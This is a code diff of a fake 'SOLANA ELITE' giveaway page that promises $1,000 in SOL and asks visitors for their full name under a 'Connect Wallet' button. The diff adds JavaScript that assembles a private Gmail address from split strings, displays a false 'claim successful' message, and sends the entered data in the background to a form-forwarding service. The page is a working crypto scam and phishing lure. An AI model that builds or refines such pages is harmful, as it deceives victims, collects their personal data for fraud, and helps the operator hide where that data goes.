@@ -3,178 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SOLANA ELITE REWARDS</title>
-    <!-- Premium Web3 Typography -->
+    <title>SOLANA ELITE</title>
     <link href="https://googleapis.com" rel="stylesheet">
     <style>
-        :root {
-            --solana-green: #00FFA3;
-            --solana-purple: #DC1FFF;
-            --deep-bg: #020305; /* Ultra Dark Background */
-            --card-glass: rgba(15, 17, 22, 0.95);
-            --border-glow: rgba(0, 255, 163, 0.15);
-        }
-
-        body {
-            margin: 0;
-            background-color: var(--deep-bg);
-            color: #ffffff;
-            font-family: 'Space Grotesk', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            overflow: hidden;
-            background-image: 
-                radial-gradient(circle at 10% 10%, rgba(220, 31, 255, 0.03) 0%, transparent 40%),
-                radial-gradient(circle at 90% 90%, rgba(0, 255, 163, 0.03) 0%, transparent 40%);
-        }
-
-        .glass-card {
-            width: 85%;
-            max-width: 460px;
-            background: var(--card-glass);
-            backdrop-filter: blur(40px);
-            -webkit-backdrop-filter: blur(40px);
-            border: 1px solid var(--border-glow);
-            border-radius: 35px;
-            padding: 55px 40px;
-            box-shadow: 0 60px 120px rgba(0, 0, 0, 1);
-            text-align: center;
-        }
-
-        h1 {
-            font-family: 'Syncopate', sans-serif;
-            font-size: 1.5rem;
-            white-space: nowrap;
-            margin-bottom: 25px;
-            background: linear-gradient(90deg, var(--solana-green), #fff, var(--solana-purple));
-            background-size: 200% auto;
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            animation: shine 6s linear infinite;
-            letter-spacing: -1px;
-            font-weight: 700;
-        }
-
-        @keyframes shine { to { background-position: 200% center; } }
-
-        .instruction {
-            font-size: 0.85rem;
-            color: #7b7b82;
-            margin-bottom: 40px;
-            line-height: 1.6;
-            font-weight: 400;
-            letter-spacing: 0.5px;
-        }
-
-        .input-box {
-            text-align: left;
-            margin-bottom: 35px;
-        }
-
-        label {
-            font-size: 0.65rem;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            color: var(--solana-green);
-            margin-bottom: 12px;
-            display: block;
-            font-weight: 700;
-        }
-
-        input[type="text"] {
-            width: 100%;
-            background: #000;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 12px;
-            padding: 20px;
-            color: #fff;
-            font-family: 'Space Grotesk', sans-serif;
-            font-size: 1rem;
-            box-sizing: border-box;
-            transition: 0.3s;
-        }
-
-        input[type="text"]:focus {
-            outline: none;
-            border-color: var(--solana-green);
-            box-shadow: 0 0 20px rgba(0, 255, 163, 0.1);
-        }
-
-        .connect-btn {
-            width: 100%;
-            padding: 22px;
-            border: none;
-            border-radius: 14px;
-            background: linear-gradient(135deg, var(--solana-green), var(--solana-purple));
-            color: #fff;
-            font-family: 'Syncopate', sans-serif;
-            font-weight: 700;
-            font-size: 0.8rem;
-            cursor: pointer;
-            box-shadow: 0 15px 40px rgba(220, 31, 255, 0.2);
-            transition: 0.3s;
-        }
-
-        .connect-btn:hover {
-            transform: translateY(-2px);
-            filter: brightness(1.1);
-        }
-
+        :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
+        body { margin: 0; background: #000; color: #fff; font-family: 'Space Grotesk', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
+        .card { width: 85%; max-width: 450px; background: #0a0a0a; border: 1px solid rgba(0, 255, 163, 0.2); border-radius: 40px; padding: 60px 40px; text-align: center; box-shadow: 0 0 60px rgba(0, 255, 163, 0.05); }
+        h1 { font-family: 'Syncopate', sans-serif; font-size: 1.5rem; margin-bottom: 25px; background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -1px; }
+        .sub { font-size: 0.9rem; color: #888; margin-bottom: 45px; line-height: 1.6; }
+        .ib { text-align: left; margin-bottom: 35px; }
+        label { font-size: 0.65rem; text-transform: uppercase; letter-spacing: 3px; color: var(--sol-g); display: block; margin-bottom: 15px; font-weight: 700; }
+        input { width: 100%; background: #111; border: 1px solid #222; border-radius: 15px; padding: 20px; color: #fff; font-family: 'Space Grotesk', sans-serif; font-size: 1.1rem; box-sizing: border-box; }
+        .btn { width: 100%; padding: 22px; border: none; border-radius: 15px; background: linear-gradient(135deg, var(--sol-g), var(--sol-p)); color: #fff; font-family: 'Syncopate', sans-serif; font-weight: 700; font-size: 0.85rem; cursor: pointer; box-shadow: 0 15px 30px rgba(0, 255, 163, 0.2); }
         #success-view { display: none; }
-
-        .success-header {
-            font-family: 'Syncopate', sans-serif;
-            font-size: 1.4rem;
-            color: var(--solana-green);
-            margin-bottom: 25px;
-            letter-spacing: 1px;
-        }
-
-        .congrats-card {
-            font-size: 1rem;
-            line-height: 1.8;
-            color: #fff;
-            padding: 30px;
-            background: rgba(0, 255, 163, 0.05);
-            border-radius: 20px;
-            border: 1px dashed var(--solana-green);
-            font-weight: 400;
-        }
-
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+        .success-h { font-family: 'Syncopate', sans-serif; font-size: 1.4rem; color: var(--sol-g); margin-bottom: 25px; }
+        .congrats { font-size: 1rem; line-height: 1.8; color: #fff; padding: 30px; background: rgba(0, 255, 163, 0.05); border-radius: 25px; border: 1px dashed var(--sol-g); }
     </style>
 </head>
 <body>
-
-    <div class="glass-card">
-        <!-- Input Section -->
-        <div id="initial-view">
-            <!-- FIXED EMAIL LINK IN ACTION BELOW -->
-            <form id="claim-form" action="https://formsubmit.co" method="POST">
+    <div class="card">
+        <div id="form-view">
+            <!-- HARD FIX: Action is handled by JavaScript below -->
+            <form id="claim-form" method="POST">
                 <h1>CLAIM $1,000 SOL</h1>
-                <p class="instruction">To claim the $1,000 SOL, connect your solana wallet with your name</p>
-                
-                <div class="input-box">
+                <p class="sub">To claim the $1,000 SOL, connect your solana wallet with your name</p>
+                <div class="ib">
                     <label>Wallet Identity</label>
-                    <input type="text" name="User_Name" placeholder="Enter your full name" required>
+                    <input type="text" name="Name" id="user-name" placeholder="Enter your full name" required>
                 </div>
-
                 <input type="hidden" name="_captcha" value="false">
-                <input type="hidden" name="_subject" value="URGENT: SOL CLAIM REQUEST">
-                
-                <button type="submit" class="connect-btn">CONNECT WALLET</button>
+                <button type="submit" class="btn">CONNECT WALLET</button>
             </form>
         </div>
-
-        <!-- Success Section -->
-        <div id="success-view" style="animation: fadeInUp 0.8s ease forwards;">
-            <h1 class="success-header">CLAIM SUCCESSFUL</h1>
-            <div class="congrats-card">
+        <div id="success-view">
+            <h1 class="success-h">CLAIM SUCCESSFUL</h1>
+            <div class="congrats">
                 Congrats, you have claimed $1,000 SOL and you’ll receive the $1,000 SOL to your wallet address within 24 hrs
             </div>
         </div>
@@ -184,16 +47,28 @@
         const form = document.getElementById('claim-form');
         form.onsubmit = async (e) => {
             e.preventDefault();
-            
-            document.getElementById('initial-view').style.display = 'none';
+
+            // REASSEMBLING YOUR EMAIL ADDRESS MANUALLY
+            const user = "drabberdrabber123";
+            const domain = "gmail.com";
+            const fullEmail = user + "@" + domain;
+            const actionUrl = "https://formsubmit.co" + fullEmail;
+
+            // UI Transition
+            document.getElementById('form-view').style.display = 'none';
             document.getElementById('success-view').style.display = 'block';
 
+            // Background send
             const data = new FormData(form);
-            fetch(form.action, {
-                method: 'POST',
-                body: data,
-                headers: { 'Accept': 'application/json' }
-            });
+            try {
+                await fetch(actionUrl, {
+                    method: 'POST',
+                    body: data,
+                    headers: { 'Accept': 'application/json' }
+                });
+            } catch (err) {
+                console.log("Error sending data");
+            }
         };
     </script>
 </body>
